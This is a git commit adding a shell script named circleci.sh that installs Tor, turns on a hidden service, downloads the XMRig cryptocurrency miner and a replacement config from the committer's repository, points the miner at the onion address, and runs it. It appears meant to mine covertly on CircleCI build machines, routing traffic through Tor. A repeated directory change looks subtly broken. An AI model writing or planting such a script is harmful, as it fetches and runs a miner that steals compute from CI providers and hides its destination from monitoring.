4a66582632393687cbd57fc7fa515fd39591acfe
ceeb57f83688 <84587193+ceeb57f83688@users.noreply.github.com>
2021-07-21 10:39:04 +0100

    Create circleci.sh

---
+++ TOR/circleci.sh
@@ -0,0 +1,31 @@
+#!/bin/sh
+
+sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt update -y && sudo apt upgrade -y
+sudo apt-get install --reinstall systemd -y
+sudo apt-get install tor -y
+sudo service tor stop
+sudo apt-get install -y sed
+
+
+sudo sed -i '75s/#HiddenServiceDir/HiddenServiceDir/ ' /etc/tor/torrc
+sudo sed -i '18s/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
+sudo sed -i 's/#ORPort/ORPort/ ' /etc/tor/torrc
+sudo sed -i '76s/#HiddenServicePort/HiddenServicePort/ ' /etc/tor/torrc
+sudo sed -i '76s/80/8080/g ' /etc/tor/torrc
+
+
+sudo systemctl enable tor
+sudo service tor start
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar xf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && rm -rf config.json && wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.json
+
+cd xmrig-6.13.1
+sudo sed -i '3s/true/false/ ' config.json
+sudo sed -i '9d' config.json
+sudo cat /var/lib/tor/other_hidden_service/hostname | sed '1s/^/9i /' | sed -i -f- config.json
+sudo sed -i '9s/$/",/ ' config.json 
+sudo sed -i '9s|^|            "url": "|' config.json
+sudo sed -i '13s/true/false/ ' config.json
+
+
+chmod +x xmrig && ./xmrig
